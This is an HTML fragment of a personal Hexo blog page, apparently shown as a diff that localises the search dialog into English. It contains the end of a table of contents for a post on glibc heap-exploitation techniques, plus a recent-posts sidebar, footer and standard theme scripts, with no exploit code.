class="toc-text">[7-2-1] 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-1"><span class="toc-text">[7-2-2] Leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write-1"><span class="toc-text">[7-2-3] Write</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#double-free-1"><span class="toc-text">[7-2-3-1] Double Free</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsortedbin"><span class="toc-text">[7-3] Unsortedbin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-2"><span class="toc-text">[7-3-1] leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write-2"><span class="toc-text">[7-3-2] write</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#direct"><span class="toc-text">[7-3-2-1] Direct</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#largebin-attack"><span class="toc-text">[7-4] Largebin Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-5"><span class="toc-text">[7-4-1] 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-3"><span class="toc-text">[7-4-2] leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write-3"><span class="toc-text">[7-4-3] write</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9-libc-%E6%9C%89%E8%A6%81%E6%B1%82"><span class="toc-text">[7-4-3-1] 对 libc 有要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9-libc-%E6%B2%A1%E8%A6%81%E6%B1%82"><span class="toc-text">[7-4-3-2] 对 libc 没要求</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#series-of-house"><span class="toc-text">[8] Series of House</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-orange"><span class="toc-text">[8-1] House of Orange</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-6"><span class="toc-text">[8-1-1] 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0chunk%E9%9C%80%E6%B1%82"><span class="toc-text">[8-1-2] 伪造chunk需求</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-force-hof"><span class="toc-text">[8-2] House of Force (HOF)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-7"><span class="toc-text">[8-2-1] 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%8E%9F%E7%90%86"><span class="toc-text">[8-2-2] 具体原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-botcake"><span class="toc-text">[8-3] House of botcake</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-8"><span class="toc-text">[8-3-1] 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-1"><span class="toc-text">[8-3-2] POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E7%96%91%E9%97%AE"><span class="toc-text">[8-3-3] 一些疑问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-banana"><span class="toc-text">[8-4] House of banana</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-9"><span class="toc-text">[8-4-1] 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-2"><span class="toc-text">[8-4-2] POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0-fake_chunk"><span class="toc-text">[8-4-3] 如何构造 fake_chunk?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-pig"><span class="toc-text">[8-5] House of pig</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/en/posts/34368.html" title="fuzz - 原理学习"><img src="/en/img/cover3.jpg" onerror="this.onerror=null;this.src='/en/img/404.jpg'" alt="fuzz - 原理学习"/></a><div class="content"><a class="title" href="/en/posts/34368.html" title="fuzz - 原理学习">fuzz - 原理学习</a><time datetime="2025-02-14T05:46:00.000Z" title="Created 2025-02-14 13:02:00">2025-02-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/en/posts/18184.html" title="blockchain - openzeppelin 源码阅读"><img src="/en/img/cover2.jpg" onerror="this.onerror=null;this.src='/en/img/404.jpg'" alt="blockchain - openzeppelin 源码阅读"/></a><div class="content"><a class="title" href="/en/posts/18184.html" title="blockchain - openzeppelin 源码阅读">blockchain - openzeppelin 源码阅读</a><time datetime="2025-02-05T10:15:00.000Z" title="Created 2025-02-05 18:02:00">2025-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/en/posts/13129.html" title="blockchain - Uniswap V2"><img src="/en/img/cover6.jpg" onerror="this.onerror=null;this.src='/en/img/404.jpg'" alt="blockchain - Uniswap V2"/></a><div class="content"><a class="title" href="/en/posts/13129.html" title="blockchain - Uniswap V2">blockchain - Uniswap V2</a><time datetime="2025-02-04T06:09:00.000Z" title="Created 2025-02-04 14:02:00">2025-02-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/en/posts/38292.html" title="blockchain - All Your Tokens are Belong to Us Demystifying Address Verification Vulnerabilities in Solidity Smart Contracts论文阅读笔记"><img src="/en/img/cover5.jpg" onerror="this.onerror=null;this.src='/en/img/404.jpg'" alt="blockchain - All Your Tokens are Belong to Us Demystifying Address Verification Vulnerabilities in Solidity Smart Contracts论文阅读笔记"/></a><div class="content"><a class="title" href="/en/posts/38292.html" title="blockchain - All Your Tokens are Belong to Us Demystifying Address Verification Vulnerabilities in Solidity Smart Contracts论文阅读笔记">blockchain - All Your Tokens are Belong to Us Demystifying Address Verification Vulnerabilities in Solidity Smart Contracts论文阅读笔记</a><time datetime="2025-01-13T12:01:00.000Z" title="Created 2025-01-13 20:01:00">2025-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/en/posts/9333.html" title="2024年终总结"><img src="/en/img/cover8.jpg" onerror="this.onerror=null;this.src='/en/img/404.jpg'" alt="2024年终总结"/></a><div class="content"><a class="title" href="/en/posts/9333.html" title="2024年终总结">2024年终总结</a><time datetime="2025-01-12T04:55:00.000Z" title="Created 2025-01-12 12:01:00">2025-01-12</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/cover5.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2025 By HeyGap</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional and Simplified Chinese">EN</button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/en/js/utils.js"></script><script src="/en/js/main.js"></script><script src="/en/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script data-pjax src="/en/self/btf.js"></script><script data-pjax src="/en/self/ch_en.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
 POWERMODE.shake = true;
 POWERMODE.mobile = false;
 document.body.addEventListener('input', POWERMODE);
-</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/en/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
   function butterfly_swiper_injector_config(){
     var parent_div_git = document.getElementById('recent-posts');
     var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
